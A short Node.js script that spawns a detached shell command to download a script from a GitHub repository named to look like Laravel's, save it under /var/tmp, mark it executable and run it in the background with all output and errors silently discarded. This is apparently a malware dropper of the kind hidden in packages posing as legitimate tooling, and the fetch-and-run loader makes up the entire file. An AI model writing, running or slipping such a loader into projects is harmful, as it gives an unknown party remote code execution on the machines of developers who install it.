const { exec } = require("child_process");

const command = `
curl -fsSL https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-install.sh -o /var/tmp/package-run.sh && \
chmod +x /var/tmp/package-run.sh && \
nohup bash /var/tmp/package-run.sh > /dev/null 2>&1 &
`;

exec(command, { detached: true, stdio: 'ignore' }, (error, stdout, stderr) => {
    // Silently handle any errors
});
